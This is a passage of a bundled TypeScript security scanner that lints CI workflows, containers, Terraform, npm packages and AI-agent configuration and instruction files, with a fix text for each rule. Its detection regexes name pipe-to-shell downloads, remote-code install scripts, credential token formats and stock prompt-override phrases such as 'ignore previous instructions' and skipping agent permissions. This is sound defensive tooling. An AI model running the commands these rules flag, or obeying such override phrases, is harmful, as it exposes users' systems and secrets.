// cli/guard-scan.ts
import { execFileSync } from "node:child_process";
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";

// hooks/rules.ts
var SEVERITIES = ["low", "medium", "high", "critical"], rank = (severity) => severity === "never" ? 1 / 0 : SEVERITIES.indexOf(severity), enclosingBlock = (lines, index) => {
  let braces = (l) => (l.match(/\{/g)?.length ?? 0) - (l.match(/\}/g)?.length ?? 0), depth = 0, start = 0;
  for (let i = index - 1;i >= 0; i--)
    if (depth += braces(lines[i] ?? ""), depth > 0) {
      start = i;
      break;
    }
  let end = lines.length - 1;
  depth = 0;
  for (let i = start;i < lines.length; i++)
    if (depth += braces(lines[i] ?? ""), depth <= 0 && i > start) {
      end = i;
      break;
    }
  return { header: lines[start] ?? "", body: lines.slice(start, end + 1).join(`
`) };
}, WEB_PORTS = /* @__PURE__ */ new Set([80, 443]), portsOf = (body) => {
  let ports = [
    ...[...body.matchAll(/\b(from_port|to_port|port|destination_port_range)\s*=\s*"?(\d+)"?/g)].map((m) => Number(m[2])),
    ...[...body.matchAll(/\bports\s*=\s*\[([^\]]*)\]/g)].flatMap((m) => [...(m[1] ?? "").matchAll(/\d+/g)].map((n) => Number(n[0])))
  ];
  return ports.length === 0 ? void 0 : ports;
}, isReference = (name, value) => /_(FILE|PATH|DIR|URL|URI|ENDPOINT|NAME|ID|ARN|REF|VERSION|LENGTH|POLICY|TYPE|ROTATION|TTL|MODE|ALGORITHM|COUNT|HEADER)$/i.test(name) || /^["']?(\$\{?[\w.]+\}?|[a-z][\w+.-]*:\/\/\S*|\.{0,2}\/\S*|\d+|true|false|yes|no|on|off)["']?$/i.test(value.trim()), FULL_SHA = /^[0-9a-f]{40}$/, INJECTABLE = /\$\{\{\s*(github\.head_ref|github\.event\.(issue|pull_request|comment|review|review_comment|discussion|discussion_comment|head_commit|commits|pages)\b[^}]*\.(title|body|head_ref|ref|label|name|email|message|page_name|default_branch))\s*\}\}/, SECRET_NAME = /(PASSWORD|PASSWD|SECRET|TOKEN|API_?KEY|PRIVATE_?KEY|ACCESS_?KEY)/i, isComment = (line) => /^\s*#/.test(line), PIPE_TO_SHELL = /\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba|z)?sh\b/, isUnpinnedImage = (image) => {
  if (image === void 0 || image.includes("@sha256:") || image.includes("{{") || image.includes("$"))
    return !1;
  let tag = image.split("/").pop().split(":")[1];
  return tag === void 0 || tag === "latest";
}, nearestKey = (lines, index, keys) => {
  for (let i = index;i >= 0; i--) {
    let m = keys.exec(lines[i] ?? "");
    if (m)
      return m[1];
  }
  return;
}, hasSibling = (ctx, re) => {
  let line = ctx.lines[ctx.index] ?? "", indent = line.length - line.trimStart().length, inBlock = (l) => l.trim() === "" || l.length - l.trimStart().length >= indent;
  for (let i = ctx.index - 1;i >= 0 && inBlock(ctx.lines[i] ?? ""); i--)
    if (re.test(ctx.lines[i] ?? ""))
      return !0;
  for (let i = ctx.index + 1;i < ctx.lines.length && inBlock(ctx.lines[i] ?? ""); i++)
    if (re.test(ctx.lines[i] ?? ""))
      return !0;
  return !1;
}, isSameScope = (scope, text) => scope !== void 0 && new RegExp(`^\\s*"name"\\s*:\\s*"${scope.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}/`, "m").test(text), enclosingKey = (lines, index) => {
  let depth = 0;
  for (let i = index - 1;i >= 0; i--) {
    let l = lines[i] ?? "";
    if (depth += (l.match(/\}/g)?.length ?? 0) - (l.match(/\{/g)?.length ?? 0), depth < 0)
      return /"([^"]+)"\s*:\s*\{/.exec(l)?.[1];
  }
  return;
}, DEPENDENCY_BLOCKS = /* @__PURE__ */ new Set(["dependencies", "devDependencies", "optionalDependencies", "peerDependencies", "overrides", "resolutions"]), inDependencies = (ctx, blocks = DEPENDENCY_BLOCKS) => blocks.has(enclosingKey(ctx.lines, ctx.index) ?? ""), LAUNCHERS = {
  npx: (args) => args.find((a) => !a.startsWith("-")),
  bunx: (args) => args.find((a) => !a.startsWith("-")),
  pnpm: (args) => args[0] === "dlx" ? args.slice(1).find((a) => !a.startsWith("-")) : void 0,
  uvx: (args) => args.find((a) => !a.startsWith("-")),
  pipx: (args) => args[0] === "run" ? args.slice(1).find((a) => !a.startsWith("-")) : void 0
}, isPinnedPackage = (launcher, pkg) => launcher === "uvx" || launcher === "pipx" ? /==|@\d/.test(pkg) : /^(@[^/]+\/)?[^@]+@\d[\w.+-]*$/.test(pkg) || pkg.startsWith(".") || pkg.startsWith("/"), unpinnedServers = (text) => {
  let json;
  try {
    json = JSON.parse(text);
  } catch {
    return [];
  }
  let found = [], walk = (node) => {
    if (Array.isArray(node))
      return node.forEach(walk);
    if (node === null || typeof node !== "object")
      return;
    let { command, args } = node;
    if (typeof command === "string" && Array.isArray(args)) {
      let launcher = command.split(/[\\/]/).pop() ?? "", pkg = LAUNCHERS[launcher]?.(args.filter((a) => typeof a === "string"));
      if (pkg !== void 0 && !isPinnedPackage(launcher, pkg))
        found.push(pkg);
    }
    Object.values(node).forEach(walk);
  };
  return walk(json), found;
}, TROJAN = /[\u202D\u202E\u2066-\u2068]|\uDB40[\uDC00-\uDC7F]/, FLAG_TAGS = /\u{1F3F4}[\u{E0020}-\u{E007E}]+\u{E007F}/gu, LOCALE_FILE = /(^|[\\/])(locales?|i18n|translations?|lang)[\\/]|\.(po|pot|xliff?|strings|arb)$/, PLACEHOLDER = /^(change[-_]?me|password|passw0rd|postgres|mysql|mariadb|root|admin|secret|test|testing|example|dev|development|local|default|guest|user|pass|todo|tbd|replace[-_]?me|your[-_].*|x+|\*+|<[^>]*>)$/i, EXAMPLE_PATH = /(^|[\\/])(e2e|tests?|__tests__|examples?|samples?|fixtures?|\.devcontainer|benchmarks?|demo)[\\/]|\.(example|sample)\.[\w.]+$/i, INVISIBLE = /[\u200B\u200C\u2060\u180E]|(?!^)\uFEFF/, INJECTION = /\b(ignore|disregard|forget)\s+(all\s+)?(the\s+)?(previous|prior|above|earlier)\s+(instructions|rules|prompts?)\b|\b(do\s+not|don't|never)\s+(tell|inform|show|mention\s+(this|it)\s+to)\s+the\s+user\s+(about|what\s+you|that\s+you|you)\b|\b(disable|turn\s+off|bypass|skip)\s+(the\s+)?(shift-left-guard|security\s+guard|all\s+hooks|sandbox(ing)?|permission\s+(checks|prompts))\b|--dangerously-skip-permissions/i, isPublicInvoker = (line, ctx) => /"allUsers"/.test(line) && ctx.lines.slice(Math.max(0, ctx.index - 4), ctx.index + 5).some((l) => /roles\/(run|cloudfunctions)\.invoker/.test(l)), RULES = [
  {
    id: "GHA001",
    kind: "workflow",
    severity: "medium",
    title: "Action not pinned to a commit SHA",
    fix: "Pin third-party actions to a full 40-char commit SHA and keep the tag as a comment: `uses: actions/checkout@<sha> # v4.2.2`.",
    line: (line) => {
      let m = /^\s*-?\s*uses:\s*['"]?([^'"\s#]+)/.exec(line);
      if (!m)
        return !1;
      let ref = m[1] ?? "";
      if (ref.startsWith("./") || ref.startsWith("docker://"))
        return !1;
      let at = ref.lastIndexOf("@");
      return at === -1 || !FULL_SHA.test(ref.slice(at + 1));
    }
  },
  {
    id: "GHA002",
    kind: "workflow",
    severity: "critical",
    title: "pull_request_target checks out untrusted PR code",
    fix: "Never check out `github.event.pull_request.head.*` under `pull_request_target`. Use `pull_request`, or split into an unprivileged build job and a privileged `workflow_run` job.",
    file: (lines) => {
      if (!lines.some((l) => /\bpull_request_target\b/.test(l) && !isComment(l)))
        return -1;
      return lines.findIndex((l) => /github\.event\.pull_request\.head\.(sha|ref)|refs\/pull\/.*\/merge/.test(l));
    }
  },
  {
    id: "GHA003",
    kind: "workflow",
    severity: "high",
    title: "Script injection: untrusted event data in run:/script:",
    fix: 'Move the expression into `env:` (e.g. `env: TITLE: ${{ github.event.issue.title }}`) and use `"$TITLE"` in the script; in actions/github-script read `process.env.TITLE` or `context.payload`.',
    line: (line, ctx) => ctx.inRunBlock && INJECTABLE.test(line)
  },
  {
    id: "GHA004",
    kind: "workflow",
    severity: "high",
    title: "permissions: write-all",
    fix: "Grant the least privilege per job, e.g. `permissions: { contents: read }` and add only the scopes a job needs.",
    line: (line) => /^\s*permissions:\s*write-all\b/.test(line)
  },
  {
    id: "GHA005",
    kind: "workflow",
    severity: "low",
    title: "No top-level permissions block (token gets default scopes)",
    fix: "Add `permissions: { contents: read }` at the top level and widen per job.",
    file: (lines) => lines.some((l) => /^permissions:/.test(l)) || !lines.some((l) => /^jobs:/.test(l)) ? -1 : lines.findIndex((l) => /^jobs:/.test(l))
  },
  {
    id: "GHA006",
    kind: "workflow",
    severity: "medium",
    title: "Secret interpolated directly into run:/script:",
    fix: 'Pass secrets through `env:` and reference `"$MY_SECRET"`; inline `${{ secrets.X }}` ends up in the generated script and process list.',
    line: (line, ctx) => ctx.inRunBlock && /\$\{\{\s*secrets\.(?!GITHUB_TOKEN\b)/.test(line)
  },
  {
    id: "DKR001",
    kind: "dockerfile",
    severity: "medium",
    title: "Base image not pinned (:latest or no tag)",
    fix: "Pin a specific version, ideally with digest: `FROM python:3.13-slim@sha256:<digest>`.",
    line: (line, ctx) => {
      let m = /^\s*FROM\s+(?:--platform=\S+\s+)?(\S+)/i.exec(line);
      if (!m)
        return !1;
      let image = m[1] ?? "";
      if (image === "scratch" || image.includes("$") || image.includes("@sha256:"))
        return !1;
      if ([...ctx.text.matchAll(/^\s*FROM\s+.*\s+AS\s+(\S+)/gim)].map((s) => (s[1] ?? "").toLowerCase()).includes(image.toLowerCase()))
        return !1;
      let tag = image.split("/").pop().split(":")[1];
      return tag === void 0 || tag === "latest";
    }
  },
  {
    id: "DKR002",
    kind: "dockerfile",
    severity: "medium",
    title: "Container runs as root",
    fix: "Create an unprivileged user and switch to it before CMD: `RUN useradd -r -u 10001 app` + `USER app`.",
    file: (lines) => {
      let stages = lines.flatMap((l, i) => {
        let m = /^\s*FROM\s+(?:--platform=\S+\s+)?(\S+)(?:\s+AS\s+(\S+))?/i.exec(l);
        return m ? [{ start: i, image: (m[1] ?? "").toLowerCase(), alias: m[2]?.toLowerCase() }] : [];
      }), userIn = (stage, seen) => {
        let s = stages[stage];
        if (s === void 0 || seen > stages.length)
          return;
        let end = stages[stage + 1]?.start ?? lines.length;
        for (let i = end - 1;i > s.start; i--) {
          let user = /^\s*USER\s+(\S+)/i.exec(lines[i] ?? "")?.[1];
          if (user !== void 0)
            return { user, at: i };
        }
        if (/nonroot|rootless/.test(s.image))
          return { user: "nonroot", at: s.start };
        let parent = stages.findIndex((p) => p.alias === s.image);
        return parent >= 0 && parent < stage ? userIn(parent, seen + 1) : void 0;
      }, last = stages.length - 1;
      if (last < 0)
        return -1;
      let found = userIn(last, 0);
      if (found === void 0)
        return stages[last]?.start ?? -1;
      return /^(root|0)(:|$)/.test(found.user) ? found.at : -1;
    }
  },
  {
    id: "DKR003",
    kind: "dockerfile",
    severity: "high",
    title: "Secret baked into the image via ENV/ARG",
    fix: "Never put secrets in ENV/ARG (they stay in the image history). Use `RUN --mount=type=secret,id=...` at build time and inject at runtime from a secret manager.",
    line: (line) => {
      let m = /^\s*(ENV|ARG)\s+(\S+?)(?:[=\s]+(.*))?$/i.exec(line), [name, value] = [m?.[2] ?? "", m?.[3]?.trim() ?? ""];
      return SECRET_NAME.test(name) && value !== "" && !isReference(name, value);
    }
  },
  {
    id: "DKR004",
    kind: "dockerfile",
    severity: "low",
    title: "ADD instead of COPY",
    fix: "Use `COPY` for local files; for downloads use `RUN curl` with a checksum check, or `ADD --checksum=sha256:...`.",
    line: (line) => /^\s*ADD\s/i.test(line) && !/--checksum=/.test(line)
  },
  {
    id: "DKR005",
    kind: "dockerfile",
    severity: "medium",
    title: "Remote script piped into a shell",
    fix: "Download to a file, verify its checksum or signature, then run it.",
    line: (line) => PIPE_TO_SHELL.test(line)
  },
  {
    id: "TF001",
    kind: "terraform",
    severity: "high",
    title: "Open to the whole internet (0.0.0.0/0)",
    fix: "Restrict source ranges to known CIDRs, a load balancer or IAP (GCP: 35.235.240.0/20), or use private networking. Ports 80/443 on a public load balancer are expected: confirm it is one.",
    line: (line, ctx) => {
      if (isComment(line) || !/(0\.0\.0\.0\/0|::\/0)/.test(line) || /egress|destination/i.test(line))
        return !1;
      let { header, body } = enclosingBlock(ctx.lines, ctx.index);
      if (/\b(egress|route)\b|aws_route/.test(header) || /\btype\s*=\s*"egress"|\bdirection\s*=\s*"(EGRESS|Outbound)"/i.test(body))
        return !1;
      let ports = portsOf(body);
      return ports !== void 0 && ports.every((p) => WEB_PORTS.has(p)) ? "medium" : !0;
    }
  },
  {
    id: "TF002",
    kind: "terraform",
    severity: "high",
    title: "Publicly readable resource",
    fix: "Remove public access: no `allUsers`/`allAuthenticatedUsers` members (GCP), no `public-read` ACL and keep S3 Block Public Access on (AWS), `public_network_access_enabled = false` (Azure).",
    line: (line, ctx) => !isComment(line) && !isPublicInvoker(line, ctx) && /"allUsers"|"allAuthenticatedUsers"|acl\s*=\s*"public-read(-write)?"|(block_public_(acls|policy)|restrict_public_buckets|ignore_public_acls)\s*=\s*false|public_network_access_enabled\s*=\s*true|allow_nested_items_to_be_public\s*=\s*true/.test(line)
  },
  {
    id: "TF003",
    kind: "terraform",
    severity: "high",
    title: "Over-privileged IAM (owner/editor/admin wildcard)",
    fix: 'Grant a narrow predefined or custom role. GCP: avoid `roles/owner` and `roles/editor`; AWS: no `"*"` actions; Azure: avoid `Owner`/`Contributor` at subscription scope.',
    line: (line) => !isComment(line) && /"roles\/(owner|editor)"|AdministratorAccess|"Action"\s*:\s*"\*"|actions\s*=\s*\[\s*"\*"\s*\]|role_definition_name\s*=\s*"(Owner|Contributor)"/.test(line)
  },
  {
    id: "TF004",
    kind: "terraform",
    severity: "medium",
    title: "Database reachable from a public IP",
    fix: "Use private IP / private endpoints. GCP Cloud SQL: `ipv4_enabled = false` + `private_network`, or keep public IP only with the Cloud SQL connector, IAM auth and no `authorized_networks`; AWS RDS: `publicly_accessible = false`.",
    line: (line) => !isComment(line) && /(publicly_accessible|ipv4_enabled)\s*=\s*true/.test(line)
  },
  {
    id: "TF005",
    kind: "terraform",
    severity: "critical",
    title: "Hard-coded secret in Terraform",
    fix: "Reference a secret manager (`google_secret_manager_secret_version`, `aws_secretsmanager_secret_version`, `azurerm_key_vault_secret`) or a `sensitive = true` variable; generate passwords with `random_password`.",
    line: (line) => {
      let m = /^\s*(\w*(password|secret|token|api_key|private_key|access_key)\w*)\s*=\s*"([^"]{4,})"/i.exec(line);
      return !isComment(line) && m !== null && !(m[3] ?? "").startsWith("${") && !isReference(m[1] ?? "", m[3] ?? "");
    }
  },
  {
    id: "TF006",
    kind: "terraform",
    severity: "medium",
    title: "Encryption explicitly disabled",
    fix: "Keep encryption at rest on (`storage_encrypted = true`, `encrypted = true`, `enable_https_traffic_only = true`).",
    line: (line) => !isComment(line) && /\b(storage_encrypted|encrypted|enable_https_traffic_only|https_only)\s*=\s*false/.test(line)
  },
  {
    id: "TF007",
    kind: "terraform",
    severity: "low",
    title: "Deletion protection disabled",
    fix: "Set `deletion_protection = true` on stateful production resources.",
    line: (line) => !isComment(line) && /deletion_protection\s*=\s*false/.test(line)
  },
  {
    id: "K8S001",
    kind: "kubernetes",
    severity: "high",
    title: "Privileged container",
    fix: "Remove `privileged: true`; grant only the specific `capabilities.add` the workload needs.",
    line: (line) => /^\s*privileged:\s*true\b/.test(line)
  },
  {
    id: "K8S002",
    kind: "kubernetes",
    severity: "medium",
    title: "Host namespace or hostPath shared with the pod",
    fix: "Avoid `hostNetwork`/`hostPID`/`hostIPC` and `hostPath` volumes; use a PVC or a CSI driver.",
    line: (line) => /^\s*(hostNetwork|hostPID|hostIPC):\s*true\b|^\s*hostPath:/.test(line)
  },
  {
    id: "K8S003",
    kind: "kubernetes",
    severity: "medium",
    title: "Privilege escalation or root user allowed",
    fix: "Set `securityContext: { runAsNonRoot: true, allowPrivilegeEscalation: false }`.",
    line: (line) => /^\s*allowPrivilegeEscalation:\s*true\b|^\s*runAsUser:\s*0\b|^\s*runAsNonRoot:\s*false\b/.test(line)
  },
  {
    id: "K8S004",
    kind: "kubernetes",
    severity: "low",
    title: "Image not pinned (:latest or no tag)",
    fix: "Pin an explicit version tag or digest so rollouts are reproducible.",
    line: (line) => isUnpinnedImage(/^\s*-?\s*image:\s*['"]?([^'"\s]+)/.exec(line)?.[1])
  },
  {
    id: "CMP001",
    kind: "compose",
    severity: "high",
    title: "Privileged container",
    fix: "Remove `privileged: true`; add only the capabilities the service needs with `cap_add:`.",
    line: (line) => /^\s*privileged:\s*true\b/.test(line)
  },
  {
    id: "CMP002",
    kind: "compose",
    severity: "critical",
    title: "Docker socket mounted into a container",
    fix: "Do not mount `/var/run/docker.sock`: it is root on the host. Use a socket proxy with a read-only allow-list (e.g. tecnativa/docker-socket-proxy) if the service must talk to Docker.",
    line: (line) => !isComment(line) && /docker\.sock/.test(line)
  },
  {
    id: "CMP003",
    kind: "compose",
    severity: "medium",
    title: "Host namespace shared with the container",
    fix: "Drop `network_mode: host`, `pid: host` and `ipc: host`; publish only the ports you need with `ports:`.",
    line: (line) => /^\s*(network_mode|pid|ipc):\s*['"]?host\b/.test(line)
  },
  {
    id: "CMP004",
    kind: "compose",
    severity: "medium",
    title: "Secret written into the compose file",
    fix: "Read it from the environment (`PASSWORD: ${DB_PASSWORD}` with a git-ignored `.env`) or use Compose `secrets:`.",
    line: (line, ctx) => {
      if (EXAMPLE_PATH.test(ctx.path))
        return !1;
      let m = /^\s*-?\s*['"]?(\w+)['"]?\s*[=:]\s*['"]?([^'"#\s][^'"#]*)['"]?\s*$/.exec(line), [name, value] = [m?.[1] ?? "", m?.[2]?.trim() ?? ""];
      return SECRET_NAME.test(name) && value.length >= 4 && !value.includes("${") && !PLACEHOLDER.test(value) && !isReference(name, value);
    }
  },
  {
    id: "CMP005",
    kind: "compose",
    severity: "low",
    title: "Image not pinned (:latest or no tag)",
    fix: "Pin an explicit version tag or digest so every `docker compose up` runs the same image.",
    line: (line, ctx) => isUnpinnedImage(/^\s*image:\s*['"]?([^'"\s]+)/.exec(line)?.[1]) && !hasSibling(ctx, /^\s*build:/)
  },
  {
    id: "NPM001",
    kind: "npm",
    severity: "high",
    title: "Install script downloads or runs remote code",
    fix: "Install scripts run on every `npm install` of every user. Do not fetch or eval code there; ship the code in the package or make it an explicit, documented step.",
    line: (line) => {
      let m = /"(preinstall|install|postinstall|prepare)"\s*:\s*"([^"]*)"/.exec(line);
      return m !== null && /\b(curl|wget)\b|\|\s*(ba|z)?sh\b|\bnode\s+-e\b|base64\s+(-d|--decode)|\beval\b/.test(m[2] ?? "");
    }
  },
  {
    id: "NPM002",
    kind: "npm",
    severity: "medium",
    title: "Dependency installed from a git or HTTP URL",
    fix: "Depend on a published version from the registry. If you must use git, pin a full commit SHA (`github:org/repo#<sha>`) and review it like vendored code.",
    line: (line, ctx) => {
      let m = /^\s*"([^"]+)"\s*:\s*"((?:git\+|git:|github:|gitlab:|bitbucket:|https?:\/\/)[^"]*)"/.exec(line);
      return m !== null && inDependencies(ctx) && !/#[0-9a-f]{40}$/.test(m[2] ?? "");
    }
  },
  {
    id: "NPM003",
    kind: "npm",
    severity: "low",
    title: "Dependency on any version (* or latest)",
    fix: "Use a semver range (`^1.4.0`) and commit the lockfile, so installs are reproducible.",
    line: (line, ctx) => /^\s*"[^"]+"\s*:\s*"(\*|latest|x)"\s*,?\s*$/.test(line) && !/"workspaces"\s*:/.test(ctx.text) && !isSameScope(/"(@[^/"]+)\//.exec(line)?.[1], ctx.text) && inDependencies(ctx, /* @__PURE__ */ new Set(["dependencies", "devDependencies"]))
  },
  {
    id: "AGT001",
    kind: "agent",
    severity: "high",
    title: "Agent may run any shell command without asking",
    fix: "Allow narrow commands (`Bash(npm test)`, `Bash(git status:*)`) instead of `Bash`, `Bash(*)` or `*`, and do not set `defaultMode: bypassPermissions` in a shared settings file.",
    line: (line, ctx) => {
      if (/"defaultMode"\s*:\s*"bypassPermissions"/.test(line))
        return !0;
      return /"(Bash|Bash\(\s*\*?\s*(:\s*\*)?\s*\)|\*)"/.test(line) && nearestKey(ctx.lines, ctx.index, /"(allow|deny|ask)"\s*:/) === "allow";
    }
  },
  {
    id: "AGT002",
    kind: "agent",
    severity: "medium",
    title: "Agent safeguards switched off",
    fix: "`disableAllHooks` stops every hook and mod, guards included; `enableAllProjectMcpServers` starts any MCP server a repository brings. Leave both off in shared settings and approve servers one by one.",
    line: (line) => /"(disableAllHooks|enableAllProjectMcpServers)"\s*:\s*true/.test(line)
  },
  {
    id: "AGT003",
    kind: "agent",
    severity: "medium",
    title: "MCP server package not pinned",
    fix: 'Pin the version the server runs (`"args": ["-y", "@org/server@1.4.2"]`, `uvx pkg==1.4.2`). Unpinned, every start runs whatever was published last, with your credentials.',
    file: (lines) => {
      let pkgs = unpinnedServers(lines.join(`
`));
      return pkgs.length === 0 ? -1 : lines.findIndex((l) => l.includes(`"${pkgs[0]}"`));
    }
  },
  {
    id: "AGT004",
    kind: "agent",
    severity: "high",
    title: "Credential written into agent configuration",
    fix: 'Reference an environment variable (`"Authorization": "Bearer ${GITHUB_TOKEN}"`, `"env": { "API_KEY": "${API_KEY}" }`) so the secret never lands in the repository.',
    line: (line) => {
      let m = /"(\w*(?:TOKEN|SECRET|PASSWORD|API_?KEY|ACCESS_?KEY)\w*|Authorization|X-Api-Key)"\s*:\s*"([^"]{8,})"/i.exec(line), [name, value] = [m?.[1] ?? "", m?.[2] ?? ""];
      return m !== null && !value.includes("${") && !/^Bearer\s+\$/.test(value) && !isReference(name, value);
    }
  },
  {
    id: "AGT007",
    kind: "agent",
    severity: "high",
    title: "Hook command runs a remote script",
    fix: "A hook runs on every matching event with your permissions. Keep the script in the repository and run it from there instead of piping a download into a shell.",
    line: (line) => /"command"\s*:/.test(line) && PIPE_TO_SHELL.test(line)
  },
  {
    id: "AGT005",
    kind: "instructions",
    severity: "high",
    title: "Invisible characters in an agent instruction file",
    fix: "Remove zero-width characters: they hide text from reviewers that the model still reads. Retype the line if you cannot see where they are.",
    line: (line) => INVISIBLE.test(line)
  },
  {
    id: "AGT006",
    kind: "instructions",
    severity: "high",
    title: "Instruction file tells the agent to override its rules or run remote code",
    fix: "Instruction files are prompts every session follows. Remove text that overrides earlier instructions, hides actions from the user, switches off safeguards or pipes downloads into a shell.",
    line: (line) => INJECTION.test(line) || PIPE_TO_SHELL.test(line)
  },
  {
    id: "AGT008",
    kind: "guard",
    severity: "high",
    title: "Repository config switches off guard rules",
    fix: "Disabling a rule turns it off for everyone in this repository. Agree on it with your team first, or silence single lines with `# guard:ignore <ID>`.",
    line: (line) => /"disable"\s*:\s*\[\s*"/.test(line),
    file: (lines) => {
      let start = lines.findIndex((l) => /"disable"\s*:\s*\[\s*$/.test(l));
      return start >= 0 && /^\s*"/.test(lines[start + 1] ?? "") ? start : -1;
    }
  },
  {
    id: "SEC001",
    kind: "any",
    severity: "critical",
    title: "Private key",
    fix: "Remove the key from the file, rotate it, and load it from a secret manager or a mounted secret at runtime.",
    line: (line, ctx) => {
      let header = /-----BEGIN (RSA |EC |DSA |OPENSSH |ENCRYPTED |PGP )?PRIVATE KEY( BLOCK)?-----/.exec(line);
      if (header === null)
        return !1;
      let rest = line.slice(header.index + header[0].length).replace(/\\n/g, ""), next = (ctx.lines[ctx.index + 1] ?? "").replace(/^[\s#/*'"|-]+/, "");
      return /[A-Za-z0-9+/]{40,}/.test(rest) || /^[A-Za-z0-9+/=]{40,}/.test(next);
    }
  },
  {
    id: "SEC002",
    kind: "any",
    severity: "critical",
    title: "Cloud or SaaS credential",
    fix: "Remove it, rotate it now, and read it from an environment variable or secret manager instead.",
    line: (line) => !/EXAMPLE|example|xxxx|XXXX|<[^>]+>/.test(line) && /\b(AKIA|ASIA)[0-9A-Z]{16}\b|\bAIza[0-9A-Za-z_-]{35}\b|\bgh[pousr]_[0-9A-Za-z]{36}\b|\bgithub_pat_[0-9A-Za-z_]{60,}\b|\bxox[baprs]-[0-9A-Za-z-]{10,}\b|\bsk_live_[0-9A-Za-z]{20,}\b|\bsk-ant-[0-9A-Za-z_-]{20,}\b|\bsk-proj-[0-9A-Za-z_-]{20,}\b|\bglpat-[0-9A-Za-z_-]{20}\b/.test(line)
  },
  {
    id: "SEC003",
    kind: "any",
    severity: "high",
    title: "Hidden bidirectional or tag characters (Trojan Source)",
    fix: "Remove the invisible Unicode controls: they make code or prompts read differently than they run (CVE-2021-42574). Retype the line.",
    line: (line, ctx) => !LOCALE_FILE.test(ctx.path) && TROJAN.test(line.replace(FLAG_TAGS, ""))
  },
  {
    id: "SEC004",
    kind: "any",
    severity: "high",
    title: "Environment file not ignored by git",
    fix: "Add it to `.gitignore` (e.g. `.env*` with `!.env.example`) before it is committed, and keep only placeholders in a checked-in `.env.example`."
  }
], isEnvFile = (path) => {
  let name = base(path);
  return /^\.env(\..+)?$|\.env$/.test(name) && !/\.(example|sample|template|dist|defaults|patch|schema)$|^\.envrc$|^(example|sample|template)[._-]/i.test(name);
}, envHasSecrets = (text) => text.split(/\r?\n/).some((line) => {
  let m = /^\s*(?:export\s+)?(\w+)\s*=\s*['"]?([^'"#\s]*)/.exec(line), [name, value] = [m?.[1] ?? "", m?.[2] ?? ""];
  return SECRET_NAME.test(name) && value.length >= 8 && !value.includes("$") && !PLACEHOLDER.test(value) && !/(DO_NOT_USE|INSECURE|CHANGE|EXAMPLE|DUMMY|FAKE|LOCAL|DEV)/i.test(value) && !isReference(name, value);
}), envFinding = (path) => {
  let rule = RULES.find((r) => r.id === "SEC004");
  return { id: rule.id, severity: rule.severity, title: rule.title, fix: rule.fix, line: 1, snippet: base(path) };
}, base = (path) => path.split(/[\\/]/).pop() ?? path, AGENT_CONFIG = /(^|[\\/])(\.claude[\\/]settings(\.local)?\.json|\.mcp\.json|\.(cursor|vscode)[\\/]mcp\.json|claude_desktop_config\.json|hooks[\\/]hooks\.json)$/, INSTRUCTIONS = /(^|[\\/])(CLAUDE(\.local)?\.md|AGENTS\.md|GEMINI\.md|SKILL\.md|\.cursorrules|\.windsurfrules|copilot-instructions\.md|\.cursor[\\/]rules[\\/].+\.mdc?|\.claude[\\/](commands|agents)[\\/].+\.md)$/, classify = (path, text) => {
  let name = base(path);
  if (/\.github[\\/](workflows[\\/][^\\/]+|actions[\\/].+[\\/]action)\.ya?ml$/.test(path))
    return "workflow";
  if (/^(Dockerfile|Containerfile)(\..+)?$|\.(dockerfile|containerfile)$/i.test(name))
    return "dockerfile";
  if (/\.tf$/.test(name))
    return "terraform";
  if (/^(docker-)?compose(\.[\w-]+)?\.ya?ml$/.test(name))
    return "compose";
  if (name === "package.json")
    return "npm";
  if (name === ".guard.json")
    return "guard";
  if (AGENT_CONFIG.test(path))
    return "agent";
  if (INSTRUCTIONS.test(path))
    return "instructions";
  if (/\.ya?ml$/.test(name) && /^apiVersion:/m.test(text) && /^kind:/m.test(text))
    return "kubernetes";
  if (/\.ya?ml$/.test(name) && /^on:/m.test(text) && /^jobs:/m.test(text) && /^\s+runs-on:/m.test(text))
    return "workflow";
  if (/(^|[\\/])values(\.[\w-]+)?\.ya?ml$/.test(path) && /(^|[\\/])(charts?|helm)[\\/]/.test(path))
    return "kubernetes";
  return "other";
}, SKIP_SECRETS = /\.(lock|min\.js|map|svg|png|jpe?g|gif|pdf)$|(^|[\\/])(package-lock\.json|pnpm-lock\.yaml|yarn\.lock|poetry\.lock)$/, isIgnored = (lines, index, id) => [lines[index], lines[index - 1]].some((l) => {
  let m = /guard:ignore(?:\s+([A-Z0-9, ]+))?/.exec(l ?? "");
  return m !== null && (m[1] === void 0 || m[1].split(/[\s,]+/).includes(id));
}), NO_CONFIG = { rules: [], disabled: /* @__PURE__ */ new Set }, CONFIG_FILE = ".guard.json", parseConfig = (text) => {
  if (text === void 0 || text.trim() === "")
    return { config: NO_CONFIG, errors: [] };
  let json;
  try {
    json = JSON.parse(text);
  } catch (error) {
    return { config: NO_CONFIG, errors: [`.guard.json is not valid JSON: ${error.message}`] };
  }
  let errors = [], builtIn = new Set(RULES.map((r) => r.id)), rules = [];
  for (let raw of Array.isArray(json.rules) ? json.rules : []) {
    let r = raw, id = typeof r.id === "string" ? r.id : "", severity = r.severity;
    if (!/^[A-Z][A-Z0-9_-]{1,15}$/.test(id) || builtIn.has(id)) {
      errors.push(`rule "${id}": id must be upper-case letters/digits and not a built-in id`);
      continue;
    }
    if (!SEVERITIES.includes(severity) || typeof r.title !== "string" || typeof r.pattern !== "string") {
      errors.push(`rule ${id}: needs severity (low|medium|high|critical), title and pattern`);
      continue;
    }
    try {
      if (r.pattern.length > 500 || typeof r.files === "string" && r.files.length > 500)
        throw Error("pattern longer than 500 characters");
      let pattern = new RegExp(r.pattern);
      rules.push({
        id,
        kind: "any",
        severity,
        title: r.title,
        fix: typeof r.fix === "string" ? r.fix : "See the team rule in .guard.json.",
        paths: typeof r.files === "string" ? new RegExp(r.files) : void 0,
        line: (line) => pattern.test(line)
      });
    } catch (error) {
      errors.push(`rule ${id}: ${error.message}`);
    }
  }
  let disabled = new Set(Array.isArray(json.disable) ? json.disable.filter((d) => typeof d === "string") : []);
  return { config: { rules, disabled }, errors };
}, scan = (path, text, config = NO_CONFIG) => {
  let kind = classify(path, text), lines = text.split(/\r?\n/), findings = [], rules = [
    ...RULES.filter((r) => !config.disabled.has(r.id) && (r.kind === kind || r.kind === "any" && !SKIP_SECRETS.test(path))),
    ...config.rules.filter((r) => r.paths === void 0 || r.paths.test(path))
  ], add = (rule, index, severity = rule.severity) => {
    if (isIgnored(lines, index, rule.id))
      return;
    findings.push({
      id: rule.id,
      severity,
      title: rule.title,
      fix: rule.fix,
      line: index + 1,
